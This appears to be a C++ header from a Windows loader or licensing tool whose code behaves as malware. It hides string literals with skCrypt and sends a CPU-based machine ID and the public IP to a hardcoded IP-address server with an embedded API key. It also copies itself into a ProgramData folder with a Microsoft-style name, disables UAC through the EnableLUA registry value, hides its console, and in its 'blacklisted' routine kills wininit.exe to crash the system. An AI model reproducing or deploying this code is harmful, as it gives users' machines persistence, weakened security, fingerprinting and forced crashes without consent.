#pragma once
#define WIN32_LEAN_AND_MEAN   
#include <iphlpapi.h>
#include <windows.h>
#include <intrin.h>
#include <iostream>
#include <sstream>
#include <string>
#include <iomanip>
#include <fileapi.h>
#include <conio.h>
#include <array>
#include "skStr.h"
using namespace std;

string cmd(char* pChar) {
    string input = pChar;
    int ch;
    const char* c = input.c_str();
    string output;
    FILE* UUID = _popen(c, "r");
    while ((ch = fgetc(UUID)) != EOF) {
        output += putchar(ch);
    }
    return output;
}

void notAdmin() {
    system("cls");
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    cout << "Please run this program as Admin!\n";
    system("pause");
    exit(0);
}

char* to_char(string string) {
    string += " && rem ";
    const int length = string.length();
    char* c_char = new char[length + 1];
    for (int i = 0; i < length; ++i) {
        c_char[i] = string[i];
    }
    return c_char;
}

string getCPU() {
    array< int, 4> cpuinfo;
    __cpuid(cpuinfo.data(), 1);
    ostringstream buffer;
    buffer << uppercase << hex << setfill('0') << setw(8) << cpuinfo.at(3) << setw(8) << cpuinfo.at(0);
    return buffer.str();
}

string curl(char* url) {
    string command;
    command = skCrypt("curl -s ");
    command += url;
    return cmd(to_char(command));
}

string apiCall(char* input) {
    string command;
    command = skCrypt("curl -s ");
    command += skCrypt("-H \"apikey: ");
    command += skCrypt("8ec0eb5f37d13d01248d9b2ed1c9c6a6612b8b1022f6052e253fda85e2e5e550");
    command += skCrypt("\" -H \"uuid: ");
    command += getCPU();
    command += skCrypt("\" -H \"ip: ");
    command += curl(skCrypt("api.ipify.org"));
    command += skCrypt("\" -H \"cmd: ");
    command += input;
    command += "\" ";
    command += skCrypt("http://185.38.142.105:5000/api");
    return cmd(to_char(command));
}

void notLinked(char* path) {
    string rndPath, rndName, svcName, absPath, command;
    rndPath = cmd(skCrypt("echo %programdata%\\WindowsHolographicDevices\\"));
    svcName = cmd(skCrypt("echo Micro%random%roSoft"));
    rndName = cmd(skCrypt("echo %random%.exe"));
    absPath = rndPath + rndName;
    command = "mkdir " + rndPath;
    cmd(to_char(command));
    command = skCrypt("copy ");
    command += path;
    command += " " + absPath;
    command += skCrypt(" && reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
    cmd(to_char(command));
    string code = apiCall(skCrypt("new"));
    system(skCrypt("cls"));
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    cout << "This computer is not registered!\nPlease goto discord and type\n!verify " + code << "\nPlease press any key to close this window.";
    cin >> command;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void blacklisted() {
    system(skCrypt("taskkill /f /im wininit.exe && powershell wininit"));
}